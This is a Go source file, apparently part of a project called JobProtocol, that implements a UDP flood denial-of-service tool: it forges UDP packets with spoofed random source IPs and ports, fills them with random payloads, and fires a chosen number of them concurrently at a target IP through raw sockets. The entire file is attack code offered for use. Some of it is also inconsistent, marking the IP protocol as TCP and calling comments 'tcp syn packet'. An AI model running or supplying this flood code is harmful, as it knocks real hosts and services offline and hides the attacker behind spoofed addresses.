package jobs

import (
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	globals "github.com/prairir/JobProtocol/Globals"
	"golang.org/x/net/ipv4"
)

func randomPayload() string {
	// just a bunch of random numbers added into a string
	// supposed to be random noise for the payload
	s := fmt.Sprintf("%d", rand.Int63())
	s += fmt.Sprintf("%d", rand.Int63())
	s += fmt.Sprintf("%d", rand.Int63())
	s += fmt.Sprintf("%d", rand.Int63())
	return s

}

// makes the UDP packet with a spoofed source IP and source port
// returns net/ipv4 header and bytes of tcp packet
func udpMakePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
	// the IP packet
	ipPacket := layers.IPv4{
		SrcIP:    net.ParseIP(randIP()),
		DstIP:    destIP,
		Version:  4,
		TTL:      255,
		Protocol: layers.IPProtocolTCP,
	}

	destPort := layers.UDPPort(destPortSrc)
	srcPort := layers.UDPPort(rand.Intn(65535)) // 2^16 possible ports

	// tcp syn packet
	udpPacket := layers.UDP{
		SrcPort: srcPort,
		DstPort: destPort,
	}

	sOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// do the checksum at network layer
	udpPacket.SetNetworkLayerForChecksum(&ipPacket)

	// ipHeader serialization
	ipHeaderBuffer := gopacket.NewSerializeBuffer()
	err := ipPacket.SerializeTo(ipHeaderBuffer, sOpts)
	if err != nil {
		udpHandleErr(err)
	}

	ipHeader, err := ipv4.ParseHeader(ipHeaderBuffer.Bytes())
	if err != nil {
		udpHandleErr(err)
	}

	udpBuffer := gopacket.NewSerializeBuffer()

	udpPayload := gopacket.Payload(randomPayload())
	gopacket.SerializeLayers(udpBuffer, sOpts, &udpPacket, udpPayload)

	return ipHeader, udpBuffer.Bytes()
}

// UDPFlood runs a UDP flood to destination IP for as many packets as given
func UDPFlood(destIPStr string, totalPacketToSend int) {
	// setting random seed
	rand.Seed(time.Now().UnixNano())

	destIP := net.ParseIP(destIPStr)
	udpPorts := globals.GetUDPPorts()
	// loop as many times as given
	for packetCounter := 0; packetCounter < totalPacketToSend; packetCounter++ {
		// this can happen concurrently
		go func(udpPorts []int, destIP net.IP) {
			// making the packet with a random port from list and dest IP
			ipHeader, packetBytes := udpMakePacket(udpPorts[rand.Intn(len(udpPorts))], destIP)
			packetConn, err := net.ListenPacket("udp4", destIPStr)
			if err != nil {
				udpHandleErr(err)
			}

			rawConn, err := ipv4.NewRawConn(packetConn)
			if err != nil {
				udpHandleErr(err)
			}

			rawConn.WriteTo(ipHeader, packetBytes, nil)

			rawConn.Close()

		}(udpPorts, destIP)
	}

}

func udpHandleErr(message error) {
	fmt.Println("UDPFLOOD error: " + message.Error())
}
